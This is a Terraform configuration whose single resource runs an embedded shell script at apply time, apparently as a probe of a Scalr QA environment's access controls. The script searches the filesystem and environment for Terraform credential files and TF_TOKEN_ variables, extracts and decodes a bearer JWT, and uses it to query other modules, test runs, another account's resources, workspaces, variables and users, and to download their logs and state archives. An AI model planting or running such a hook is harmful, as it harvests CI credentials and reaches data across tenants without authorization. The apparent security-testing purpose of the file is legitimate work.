resource "terraform_data" "probe" {
  provisioner "local-exec" {
    interpreter = ["/bin/sh", "-c"]
    command     = <<-EOT
      T="ENV10"
      B="https://qaenv-method-p.masster.testenv.scalr.dev/api/iacp/v3"
      echo "$T curl=$(command -v curl >/dev/null && echo yes || echo no) base64=$(command -v base64 >/dev/null && echo yes || echo no) tar=$(command -v tar >/dev/null && echo yes || echo no)"
      CF="$TF_CLI_CONFIG_FILE"
      echo "$T tf_cli_config_file=$${CF:-unset} cf_exists=$([ -f "$CF" ] && echo yes || echo no) pwd=$(pwd)"
      echo "$T home=$HOME home_terraformrc=$([ -f "$HOME/.terraformrc" ] && echo yes || echo no) home_tofurc=$([ -f "$HOME/.tofurc" ] && echo yes || echo no) tf_token_vars=$(env | grep -c '^TF_TOKEN_')"
      echo "$T rc_files=$(find / -xdev -maxdepth 7 \( -name '*.tfrc' -o -name '.terraformrc' -o -name '.tofurc' -o -name '*.terraform.rc' \) 2>/dev/null | tr '\n' ',')"
      JWT_RE='ey[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+'
      TOK=$(grep -oE "$JWT_RE" "$CF" 2>/dev/null | head -1); SRC=tf_cli_config_file
      [ -z "$TOK" ] && { TOK=$(env | grep '^TF_TOKEN_' | head -1 | cut -d= -f2-); SRC=tf_token_env; }
      [ -z "$TOK" ] && { TOK=$(grep -ohE "$JWT_RE" "$HOME/.terraformrc" "$HOME/.tofurc" 2>/dev/null | head -1); SRC=home_rc; }
      [ -z "$TOK" ] && SRC=none
      echo "$T token_found=$([ -n "$TOK" ] && echo yes || echo no) token_source=$SRC token_len=$${#TOK} cf_hosts=$(grep -oE 'credentials "[^"]+"' "$CF" 2>/dev/null | cut -d'"' -f2 | tr '\n' ',')"
      P=$(echo "$TOK" | cut -d. -f2 | tr '_-' '/+'); while [ $(( $${#P} % 4 )) -ne 0 ]; do P="$P="; done
      CL=$(echo "$P" | base64 -d 2>/dev/null)
      claim() { echo "$CL" | grep -oE "\"$1\": ?(\"[^\"]*\"|[0-9]+)" | head -1 | sed -E 's/^[^:]+: ?//; s/"//g'; }
      echo "$T jwt_iss=$(claim iss) jwt_sub=$(claim sub) jwt_exp=$(claim exp)"
      AUTH="Authorization: Bearer $TOK"
      PREF="Prefer: profile=internal"
      st() { curl -s -o /dev/null -w '%%{http_code}' -H "$AUTH" -H "$PREF" "$@"; }
      body() { curl -s -H "$AUTH" -H "$PREF" "$@"; }
      cnt() { grep -oE '"total-count": ?[0-9]+' | grep -oE '[0-9]+$' | head -1; }
      link() { grep -oE "\"$1\": ?\"[^\"]*\"" | head -1 | sed -E 's/^[^:]+: ?"//; s/"$//'; }
      echo "$T own_list=$(st "$B/test-runs?filter%5Bmodule%5D=mod-v0pgghuhkqk0dn1ge") own_list_count=$(body "$B/test-runs?filter%5Bmodule%5D=mod-v0pgghuhkqk0dn1ge" | cnt)"
      OWN=$(body "$B/test-runs?filter%5Bmodule%5D=mod-v0pgghuhkqk0dn1ge" | grep -oE 'trun-[a-z0-9]+' | head -1)
      echo "$T own_tr=$OWN own_get=$(st "$B/test-runs/$OWN")"
      TR2J=$(body "$B/test-runs/trun-v0pgghucij2279jvt")
      echo "$T tr2_get=$(st "$B/test-runs/trun-v0pgghucij2279jvt") tr2_list_m2=$(st "$B/test-runs?filter%5Bmodule%5D=mod-v0pgghu47n6mvj17p") tr2_list_m2_count=$(body "$B/test-runs?filter%5Bmodule%5D=mod-v0pgghu47n6mvj17p" | cnt)"
      OUT=$(echo "$TR2J" | link output)
      ERR=$(echo "$TR2J" | link download-errored-state)
      echo "$T tr2_output_link=$([ -n "$OUT" ] && echo yes || echo no) tr2_errored_link=$([ -n "$ERR" ] && echo yes || echo no)"
      [ -n "$OUT" ] && echo "$T tr2_log_status=$(st -L "$OUT") tr2_log_marker=$(curl -sL -H "$AUTH" "$OUT" | grep -c env10mkmovementbankview)"
      [ -n "$ERR" ] && echo "$T tr2_errored_status=$(st -L "$ERR") tr2_errored_bytes=$(curl -sL -H "$AUTH" "$ERR" | wc -c | tr -d ' ') tr2_errored_marker=$(curl -sL -H "$AUTH" "$ERR" | tar -xzO 2>/dev/null | grep -c env10mkmovementbankview)"
      echo "$T m2_get=$(st "$B/modules/mod-v0pgghu47n6mvj17p") ns2_get=$(st "$B/module-namespaces/modns-v0pgghu45th79h8j2") m2_versions=$(st "$B/module-versions?filter%5Bmodule%5D=mod-v0pgghu47n6mvj17p")"
      echo "$T xacc_tr_get=$(st "$B/test-runs/trun-v0pgghu3r0mqe91t0") xacc_tr_get_bhost=$(st "https://qaenvb-modern-kx.masster.testenv.scalr.dev/api/iacp/v3/test-runs/trun-v0pgghu3r0mqe91t0") xacc_module_get=$(st "$B/modules/mod-v0pgghtutkekhgple")"
      echo "$T list_modules=$(st "$B/modules") list_modules_count=$(body "$B/modules" | cnt) list_ns=$(st "$B/module-namespaces") list_ns_count=$(body "$B/module-namespaces" | cnt)"
      echo "$T list_ws=$(st "$B/workspaces") list_ws_count=$(body "$B/workspaces" | cnt) list_envs=$(st "$B/environments") list_envs_count=$(body "$B/environments" | cnt)"
      echo "$T list_vars=$(st "$B/vars") list_vars_count=$(body "$B/vars" | cnt) get_account=$(st "$B/accounts/acc-v0pgghk75fh9trekk") list_test_runs=$(st "$B/test-runs")"
      echo "$T list_providers=$(st "$B/providers") list_pcfg=$(st "$B/provider-configurations") list_users=$(st "$B/users")"
      exit 1
    EOT
  }
}
